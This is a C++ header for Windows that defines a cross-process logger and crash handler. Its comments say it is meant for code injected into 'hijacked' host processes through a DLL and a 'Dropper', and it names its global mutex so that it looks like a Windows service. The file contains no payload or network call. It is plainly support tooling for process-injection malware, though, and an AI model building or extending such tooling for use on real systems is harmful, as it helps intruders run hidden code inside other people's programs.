#pragma once
#include <windows.h>
#include <stdio.h>

/* * Universal public path. 
 * Even high-privilege system processes or low-privilege apps can write here.
 */
static const char* g_LogPath = "log\\Shattered_Master_Debug.txt";
static char g_CurrentProcessName[MAX_PATH] = "Unknown";
static DWORD g_CurrentPID = 0;

/* Thread-Safe, Cross-Process Universal Logger */
inline void ForceLogUniversal(const char* format, ...) {
    /* * GLOBAL MUTEX: This prevents Notepad and TaskManager from 
     * trying to write to the file at the exact same time and corrupting it.
     */
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\WinSvcLogMtx_7A3B");
    if (hMutex) {
        WaitForSingleObject(hMutex, INFINITE); // Wait in line
        
        FILE* f;
        fopen_s(&f, g_LogPath, "a+");
        if (f) {
            // Always stamp the PID and the name of the hijacked exe
            fprintf(f, "[PID: %05lu | %-15s] ", g_CurrentPID, g_CurrentProcessName);
            
            va_list args;
            va_start(args, format);
            vfprintf(f, format, args);
            va_end(args);
            
            fprintf(f, "\n");
            fclose(f);
        }
        
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
}

/* The God-Mode Exception Filter for ANY injected process */
inline LONG WINAPI UniversalCrashHandler(EXCEPTION_POINTERS* pExceptionInfo) {
    ForceLogUniversal("=========================================");
    ForceLogUniversal("[!!! FATAL CRASH IN HIJACKED HOST !!!]");
    ForceLogUniversal("Exception Code: 0x%08X", pExceptionInfo->ExceptionRecord->ExceptionCode);
    ForceLogUniversal("Crash Address:  0x%p", pExceptionInfo->ExceptionRecord->ExceptionAddress);
    
    ForceLogUniversal("--- CPU REGISTERS ---");
    ForceLogUniversal("RAX: 0x%p | RBX: 0x%p | RCX: 0x%p", 
        pExceptionInfo->ContextRecord->Rax, pExceptionInfo->ContextRecord->Rbx, pExceptionInfo->ContextRecord->Rcx);
    ForceLogUniversal("RDX: 0x%p | RSI: 0x%p | RDI: 0x%p", 
        pExceptionInfo->ContextRecord->Rdx, pExceptionInfo->ContextRecord->Rsi, pExceptionInfo->ContextRecord->Rdi);
    ForceLogUniversal("RIP (Instruction): 0x%p", pExceptionInfo->ContextRecord->Rip);
    ForceLogUniversal("=========================================");
    
    return EXCEPTION_EXECUTE_HANDLER; 
}

/* Wrap around any API to instantly catch silent failures */
#define CHECK_API(apiCall) \
    if (!(apiCall)) { \
        DWORD err = GetLastError(); \
        ForceLogUniversal("[API FAILURE] %s | Error: %lu (0x%X)", #apiCall, err, err); \
    }

/* Call this in DllMain and your Dropper main() */
inline void InitGodModeLogger() {
    // Steal the identity of the process we just woke up inside of
    g_CurrentPID = GetCurrentProcessId();
    GetModuleFileNameA(NULL, g_CurrentProcessName, MAX_PATH);
    
    // Strip the long folder path, we just want the exe name (e.g., "NoteSvc.exe")
    char* lastSlash = strrchr(g_CurrentProcessName, '\\');
    if (lastSlash) {
        memmove(g_CurrentProcessName, lastSlash + 1, strlen(lastSlash + 1) + 1);
    }
    
    // Hook the crash handler
    SetUnhandledExceptionFilter(UniversalCrashHandler);
    
    ForceLogUniversal("\n\n--- INJECTION ONLINE ---");
    ForceLogUniversal("[+] Global Mutex Logger hooked. Awaiting commands...");
}
